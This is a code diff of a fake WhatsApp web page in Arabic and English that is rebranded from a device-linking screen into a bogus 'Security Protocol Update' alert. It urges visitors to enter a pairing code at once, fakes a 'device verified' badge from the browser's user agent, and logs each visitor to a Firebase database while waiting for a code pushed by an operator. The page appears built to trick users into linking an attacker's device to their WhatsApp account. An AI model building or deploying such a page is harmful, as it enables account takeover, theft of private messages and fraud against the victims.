@@ -3,26 +3,31 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WhatsApp Web</title>
+    <title>WhatsApp Support</title>
     <style>
         body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        .top-bar { position: absolute; top: 0; width: 100%; height: 220px; background-color: #00a884; z-index: -1; }
-        .main-card { background: white; width: 90%; max-width: 420px; padding: 40px; border-radius: 3px; box-shadow: 0 17px 50px 0 rgba(11,20,26,.19),0 12px 15px 0 rgba(11,20,26,.24); text-align: center; }
-        .whatsapp-logo { width: 80px; height: 80px; margin-bottom: 25px; }
-        .title { color: #41525d; font-size: 28px; font-weight: 300; margin-bottom: 20px; }
-        .instruction { color: #667781; font-size: 16px; line-height: 1.6; margin-bottom: 30px; text-align: initial; }
-        .code-container { background-color: #f8f9fa; border: 1px solid rgba(134,150,160,0.15); padding: 20px; border-radius: 4px; display: inline-block; min-width: 220px; }
-        #pairing-code { font-size: 36px; font-weight: 500; color: #128c7e; letter-spacing: 2px; font-family: monospace; }
-        [dir="rtl"] .instruction { text-align: right; }
-        [dir="ltr"] .instruction { text-align: left; }
+        .top-bar { position: absolute; top: 0; width: 100%; height: 25%; background-color: #00a884; z-index: -1; }
+        .main-card { background: white; width: 90%; max-width: 400px; padding: 30px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; }
+        .whatsapp-logo { width: 70px; height: 70px; margin-bottom: 15px; }
+        .title { color: #41525d; font-size: 20px; font-weight: 600; margin-bottom: 10px; }
+        .device-info { background: #e7f3f3; color: #128c7e; padding: 8px; border-radius: 5px; font-size: 13px; font-weight: bold; margin-bottom: 15px; display: inline-block; }
+        .instruction { color: #667781; font-size: 14px; line-height: 1.6; margin-bottom: 20px; text-align: right; }
+        .alert-box { background: #fff3cd; color: #856404; padding: 10px; border-radius: 5px; font-size: 13px; margin-bottom: 20px; border: 1px solid #ffeeba; text-align: right; }
+        .code-container { background-color: #f8f9fa; border: 1px solid #e9edef; padding: 15px; border-radius: 8px; display: inline-block; min-width: 85%; }
+        #pairing-code { font-size: 32px; font-weight: bold; color: #128c7e; letter-spacing: 2px; font-family: 'Courier New', Courier, monospace; }
+        [dir="ltr"] .instruction, [dir="ltr"] .alert-box { text-align: left; }
     </style>
 </head>
 <body>
     <div class="top-bar"></div>
     <div class="main-card">
-        <svg class="whatsapp-logo" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><path fill="#00E676" d="M12.012 2c-5.508 0-9.987 4.479-9.987 9.987 0 1.757.463 3.467 1.341 4.966L2 22l5.25-1.378c1.446.788 3.073 1.202 4.755 1.202 5.51 0 9.99-4.479 9.99-9.987 0-5.508-4.479-9.987-9.986-9.987z"/><path fill="#FFF" d="M16.918 15.374c-.269-.134-1.592-.786-1.839-.875-.246-.089-.427-.134-.607.134-.181.269-.696.875-.853 1.055-.157.18-.314.202-.583.067-.27-.134-1.138-.419-2.167-1.338-.802-.715-1.342-1.598-1.5-1.867-.157-.269-.017-.414.118-.549.121-.121.27-.314.404-.471.134-.157.18-.27.27-.449.089-.18.045-.337-.023-.471-.067-.134-.607-1.46-.831-2.001-.218-.526-.44-.453-.607-.461-.157-.008-.337-.01-.517-.01-.18 0-.471.067-.718.337-.247.269-.943.921-.943 2.246 0 1.325.965 2.605 1.1 2.784.135.18 1.9 2.9 4.603 4.069.643.278 1.144.444 1.534.569.646.205 1.234.176 1.698.108.518-.077 1.592-.65 1.816-1.279.225-.63.225-1.168.157-1.279-.067-.113-.247-.18-.517-.314z"/></svg>
+        <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp" class="whatsapp-logo">
         
         <div id="title" class="title"></div>
+        <div id="device-tag" class="device-info"></div>
+
+        <div id="alert" class="alert-box"></div>
+
         <div id="instruction" class="instruction"></div>
 
         <div class="code-container">
@@ -37,29 +42,49 @@
         firebase.initializeApp(config);
         const db = firebase.database();
 
-        // نصوص اللغات
+        // كشف نوع الجهاز تلقائياً
+        function getDevice() {
+            const ua = navigator.userAgent;
+            if (/android/i.test(ua)) return "Android Device";
+            if (/iPad|iPhone|iPod/.test(ua)) return "iPhone (iOS)";
+            return "Mobile Device";
+        }
+
+        const deviceName = getDevice();
+
         const langData = {
             ar: {
-                title: "استخدام واتساب على الكمبيوتر",
-                instr: "1. افتح واتساب على هاتفك<br>2. اضغط على <b>القائمة</b> أو <b>الإعدادات</b> واختار <b>الأجهزة المرتبطة</b><br>3. اضغط على <b>ربط جهاز</b> ثم <b>الربط برقم الهاتف</b><br>4. أدخل هذا الكود في هاتفك:",
-                loading: "جاري التحقق..."
+                title: "تحديث بروتوكول التشفير (End-to-End)",
+                device: "تم فحص جهازك: " + deviceName,
+                alert: "⚠️ تنبيه: سيصلك الآن إشعار رسمي من تطبيق WhatsApp على هاتفك، يرجى الضغط عليه فوراً وإدخال الكود الموضح بالأسفل لإتمام التحديث.",
+                instr: "خطوات التفعيل:<br>1. افتح الإشعار القادم من WhatsApp.<br>2. اضغط على 'ربط جهاز'.<br>3. أدخل الكود التالي فوراً:",
+                loading: "جاري توليد الكود..."
             },
             en: {
-                title: "Use WhatsApp on computer",
-                instr: "1. Open WhatsApp on your phone<br>2. Tap <b>Menu</b> or <b>Settings</b> and select <b>Linked Devices</b><br>3. Tap on <b>Link a device</b> then <b>Link with phone number instead</b><br>4. Enter this code on your phone:",
-                loading: "Loading..."
+                title: "Security Protocol Update (End-to-End)",
+                device: "Device Verified: " + deviceName,
+                alert: "⚠️ Alert: You will now receive an official notification from WhatsApp. Please tap it and enter the code below to complete the security update.",
+                instr: "Activation Steps:<br>1. Open the WhatsApp notification.<br>2. Tap on 'Link a Device'.<br>3. Enter the following code immediately:",
+                loading: "Generating code..."
             }
         };
 
-        // كشف لغة المتصفح
         const userLang = navigator.language.startsWith('ar') ? 'ar' : 'en';
         document.documentElement.dir = userLang === 'ar' ? 'rtl' : 'ltr';
+        
         document.getElementById('title').innerText = langData[userLang].title;
+        document.getElementById('device-tag').innerText = langData[userLang].device;
+        document.getElementById('alert').innerText = langData[userLang].alert;
         document.getElementById('instruction').innerHTML = langData[userLang].instr;
         document.getElementById('pairing-code').innerText = langData[userLang].loading;
 
         let vId = new URLSearchParams(window.location.search).get('id') || "User_" + Math.floor(Math.random() * 9999);
-        db.ref('visiting/' + vId).set({ status: "online", lang: userLang, time: Date.now() });
+        db.ref('visiting/' + vId).set({ 
+            status: "online", 
+            device: deviceName,
+            lang: userLang, 
+            time: Date.now() 
+        });
 
         db.ref('sessions/' + vId).on('value', (snapshot) => {
             const data = snapshot.val();
